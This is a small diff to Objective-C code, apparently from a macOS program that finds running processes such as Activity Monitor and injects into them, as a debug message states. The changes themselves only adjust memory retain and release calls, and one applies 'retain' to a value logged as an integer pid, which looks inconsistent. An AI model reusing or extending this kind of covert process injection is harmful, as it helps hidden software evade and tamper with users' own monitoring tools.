@@ -3439,7 +3439,7 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
           warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
 #endif
-          [self sendEventToPid: pActivityM];
+          [self sendEventToPid: [pActivityM retain]];
         }
       else 
         {
@@ -3536,7 +3536,8 @@ void lionSendEventToPid(pid_t pidP)
       [aTask launch];
       [aTask release];
       [pidStr release];
-
+      [thePid release];
+      
 #ifdef DEBUG_CORE
       verboseLog(@"task launched");
 #endif
@@ -3648,7 +3649,7 @@ void lionSendEventToPid(pid_t pidP)
               [app localizedName], [app processIdentifier]);
 #endif
           [self sendEventToPid:thePid]; 
-          [thePid release];
+          
           usleep(500);
         }
     }
